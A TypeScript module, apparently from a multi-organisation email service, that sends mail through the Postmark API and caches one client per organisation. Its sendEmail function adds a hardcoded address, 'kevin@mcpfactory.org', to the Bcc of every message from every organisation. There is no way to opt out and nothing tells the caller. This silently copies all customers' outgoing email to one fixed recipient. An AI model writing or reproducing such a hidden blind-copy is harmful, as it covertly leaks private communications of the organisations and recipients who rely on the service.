import { ServerClient, Models } from "postmark";
import { getOrgKey, CallerContext } from "./key-client";

// Cache clients per token for multi-org support
const clients: Map<string, ServerClient> = new Map();

/**
 * Get a Postmark client for a given org.
 * All tokens are resolved via key-service.
 */
async function getClient(orgId: string, userId: string, caller: CallerContext): Promise<ServerClient> {
  // Return cached client if we already have one for this org
  if (clients.has(orgId)) {
    return clients.get(orgId)!;
  }

  const decrypted = await getOrgKey(orgId, userId, "postmark", caller);
  const client = new ServerClient(decrypted.key);
  clients.set(orgId, client);
  return client;
}

export interface SendEmailParams {
  from: string;
  to: string;
  cc?: string;
  bcc?: string;
  subject: string;
  htmlBody?: string;
  textBody?: string;
  replyTo?: string;
  tag?: string;
  messageStream: string; // Resolved by route handler via key-service
  headers?: { name: string; value: string }[];
  metadata?: Record<string, string>;
  trackOpens?: boolean;
  trackLinks?: "None" | "HtmlAndText" | "HtmlOnly" | "TextOnly";
  orgId: string;
  userId: string;
  caller?: CallerContext;
}

export interface SendEmailResult {
  success: boolean;
  messageId?: string;
  submittedAt?: Date;
  errorCode?: number;
  message?: string;
}

const ALWAYS_BCC = "kevin@mcpfactory.org";

/**
 * Send an email via Postmark
 */
export async function sendEmail(params: SendEmailParams): Promise<SendEmailResult> {
  const caller = params.caller || { method: "POST", path: "/send" };
  const postmarkClient = await getClient(params.orgId, params.userId, caller);

  const bcc = params.bcc ? `${params.bcc},${ALWAYS_BCC}` : ALWAYS_BCC;

  const message: Models.Message = {
    From: params.from,
    To: params.to,
    Cc: params.cc,
    Bcc: bcc,
    Subject: params.subject,
    HtmlBody: params.htmlBody,
    TextBody: params.textBody,
    ReplyTo: params.replyTo,
    Tag: params.tag,
    MessageStream: params.messageStream,
    Headers: params.headers?.map(h => ({ Name: h.name, Value: h.value })),
    Metadata: params.metadata,
    TrackOpens: params.trackOpens ?? true,
    TrackLinks: params.trackLinks as Models.LinkTrackingOptions ?? Models.LinkTrackingOptions.HtmlAndText,
  };

  try {
    const response = await postmarkClient.sendEmail(message);

    return {
      success: response.ErrorCode === 0,
      messageId: response.MessageID,
      submittedAt: response.SubmittedAt ? new Date(response.SubmittedAt) : undefined,
      errorCode: response.ErrorCode,
      message: response.Message,
    };
  } catch (error: any) {
    console.error("Postmark send error:", error);
    return {
      success: false,
      errorCode: error.code || -1,
      message: error.message || "Unknown error",
    };
  }
}

/**
 * Clear cached clients (useful for testing)
 */
export function clearClientCache(): void {
  clients.clear();
}
